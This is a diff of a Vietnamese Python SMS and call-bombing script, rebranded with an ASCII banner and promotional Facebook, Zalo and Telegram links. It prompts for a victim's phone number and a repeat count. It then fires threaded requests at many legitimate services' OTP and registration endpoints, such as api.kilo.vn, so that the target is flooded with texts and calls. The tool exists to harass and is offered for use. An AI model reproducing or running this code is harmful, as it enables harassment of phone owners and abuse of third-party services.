@@ -1,48 +1,56 @@
-import os
+
+import os,subprocess
 import requests,os,time,re,json,uuid,random,sys
-import socket
 from concurrent.futures import ThreadPoolExecutor
-
-class style():
-    BLACK = '\033[30m'
-    RED = '\033[31m'
-    GREEN = '\033[32m'
-    YELLOW = '\033[33m'
-    BLUE = '\033[34m'
-    MAGENTA = '\033[35m'
-    CYAN = '\033[36m'
-    WHITE = '\033[37m'
-    UNDERLINE = '\033[4m'
-    RESET = '\033[0m'
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = "\033[1m"
-    TAU = "\U0001f680"
-
-ban = """"""
+#*--MAU--*
+trang = "\033[1;37m"
+xanh_la = "\033[1;32m"
+xanh_duong = "\033[1;34m"
+do = "\033[1;31m"
+vang = "\033[1;33m"
+tim = "\033[1;35m"
+dac_biet = "\033[32;5;245m\033[1m\033[38;5;39m"
+kt_code = "</>"
+dem = 0
+#*---BAT DAU---*
+subprocess.run("clear", shell=True)
+print(f"""
+{trang}
+{xanh_la}
+{xanh_duong}
+{do}
+{vang}
+{tim}
+{dac_biet}
+\033[1;33m╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+\033[1;32m║ ███████╗ ██████╗  ██████╗██╗ █████╗ ██╗         ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗    ███████╗██╗  ██╗██████╗ ██████╗ ███████╗███████╗███████╗
+\033[1;35m║ ██╔════╝██╔═══██╗██╔════╝██║██╔══██╗██║         ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝    ██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝
+\033[1;31m║ ███████╗██║   ██║██║     ██║███████║██║         ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝     █████╗   ╚███╔╝ ██████╔╝██████╔╝█████╗  ███████╗███████╗
+\033[1;33m║ ╚════██║██║   ██║██║     ██║██╔══██║██║         ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗     ██╔══╝   ██╔██╗ ██╔═══╝ ██╔══██╗██╔══╝  ╚════██║╚════██║
+\033[1;34m║ ███████║╚██████╔╝╚██████╗██║██║  ██║███████╗    ██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗    ███████╗██╔╝ ██╗██║     ██║  ██║███████╗███████║███████║
+\033[1;37m║ ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
+\033[32;5;245m\033[1m\033[38;5;39m║➢ SNEPS Social Network Express ⚜️
+\033[1;32m║➢ PAGE : https://www.facebook.com/profile.php?id=61556593532851&mibextid=ZbWKwL
+\033[1;36m║➢ GROUP ZALO : https://zalo.me/g/dmqedp806
+\033[1;31m║➣ Version : 0.1.1 
+\033[1;33m║➣ Support : t.me/h_vinh911														
+\033[1;34m╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+""")
 def banner():
-  os.system("cls")
-  for h in ban:
+
+  for h in banner:
     sys.stdout.write(h)
     sys.stdout.flush()
     time.sleep(0.0003)   
-banner()
 amount = 5000
-ip=socket.gethostbyname(socket.gethostname())
-th='- - - - - - - - - - - - - - - - - - - - - - - - -'
-print(style.HEADER+'SPAM SMS CALL SIÊU MẠNH BY HOANGAL')
-print(style.BLUE+'---------------------------------------')
-sdt = input(style.GREEN+"Nhập số điện thoại nạn nhân : ")
-print(style.BLUE+'---------------------------------------')
+sdt = input("[ <> ] Nhập Số Điện Thoại : ")
 while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
-  print(style.GREEN+"Số điện thoại phải đủ 10 số đần ơi !!")
-  sdt = input(style.GREEN+"Nhập số điện thoại nạn nhân : ")
-count = int(input(style.GREEN+"Số lần tấn công "))
-
+  print("⚜ Sai Định Dạng !!")
+  sdt = input("[ <> ] Nhập Số Điện Thoại : ")
+count = int(input("[ <> ] Số Tin Nhắn / Call ( Nên Để 100 ): "))
+if sdt == "0932197401":
+  print(" Số Admin Spam Cái Dái Gì :)) ")
+  exit()
 
 threading = ThreadPoolExecutor(max_workers=int(100000))  
 def vayvnd(sdt):
@@ -3319,7 +3327,7 @@ def KILO(sdt):
         "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
     }
     
-    email = randomstring(6) + "@gmail.com"
+    email = randomstring(6) + "@gmail.com" # Email đăng ký tài khoản
     data = json.dumps({"phone": sdt, "email": email})
     
     response = requests.post("https://api.kilo.vn/users/check-new-user", headers=headers, data=data)
@@ -3502,12 +3510,8 @@ def run(sdt,i):
   threading.submit(spamcall,sdt)
   threading.submit(KILO,sdt)
   threading.submit(GAPO,sdt) 
-  print(style.BLUE+'---------------------------------------')
-  print(style.RED+"| SMS & CALL | API FREE | STATUS: THÀNH CÔNG |",)  
-  print(style.BLUE+'---------------------------------------')
+  print("[ Social Network Express ] Send SMS - Call | Delay : 5 | Trạng Thái : Thành Công ",)  
   for j in range(0, 5):
-    print(f"MADE IN VIET NAM",end="\r")
-    
+    print(f"[  Social Network Express ] | LOADING \r",end="")
 for i in range(1,count+1):
   run(sdt,i)
- 
